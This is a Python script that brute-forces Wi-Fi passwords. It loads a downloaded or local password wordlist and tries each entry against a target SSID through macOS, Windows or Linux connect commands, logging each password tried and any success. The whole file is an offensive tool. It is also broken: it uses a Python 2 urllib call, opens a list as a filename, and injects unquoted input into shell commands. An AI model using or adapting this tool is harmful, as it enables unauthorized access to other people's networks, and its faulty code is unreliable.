import wifi
import urllib
import datetime
# SSID and wordlist
# ssid = "Teddy's Network 5G"
# wordlist = 'words.txt'
# interface = 'en0'
import os
import platform

def get_os_cmd(interface,ssid,password):
    os_name = platform.system().lower()
    if 'darwin' in os_name:
        command = f'networksetup -setairportnetwork {interface} "{ssid}" {password}'
        return command
    elif 'windows' in os_name:
        command = f'netsh wlan set profileparameter name={interface} ssid={ssid} keyMaterial={password}'
        return command
    elif 'linux' in os_name:
        command = f'iwconfig {interface} essid "{ssid}" key s:{password}'
        return command
    else:
        return 'unknown'


import subprocess
ssid = input('Enter SSID: ')
intter = input('Enter Interface Name: ')
interface  = intter

ynw = input(f'\n[1] Use most common passwords wordslist.\n[2] Custom Word List \n')
if ynw =='1':

    wdurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100000.txt"
    response = urllib.urlopen(wdurl)
    txt = response.read()
    passwords = txt.splitlines()
elif ynw =='2':
    wordssc = input('Enter Filename for wordlist:') 
    try:
        passwords = open(wordssc,'r').readlines()
    except:
        print('Error: Could not read')
        exit()
    
else:
    print('Invalid Choice ')
    exit()
def connect_to_wifi(ssid, password):
    command = get_os_cmd(interface,ssid,password)
    # print(command)
    asv =subprocess.check_output(command, shell=True)
    current_time = datetime.datetime.now()
    if str(asv).startswith('b"Failed'):
        print(f'[x] Error, Login to wifi: {ssid}, password: {password}')
        with open("log.txt", "a") as f:
            f.write(f"{current_time} - Failed - SSID: {ssid} - Password: {password}\n")
        return False

    elif str(asv).startswith('b"Could not'):
        print(f'[x] Error, Login to wifi: {ssid} Could not find network')
        with open("log.txt", "a") as f:
            f.write(f"{current_time} - Could not find network {ssid} \n")
        return True
    else:
        with open("log.txt", "a") as f:
            f.write(f"{current_time} - Success - SSID: {ssid} - Password: {password}\n")
        print(f'[+] Success, Login to wifi: {ssid}, password: {password}')
        return True

       
        
 
        
    # os.system(command)


for _ in open(passwords,'r').readlines():
    cd = connect_to_wifi(ssid,_)
    if cd==True: 
        break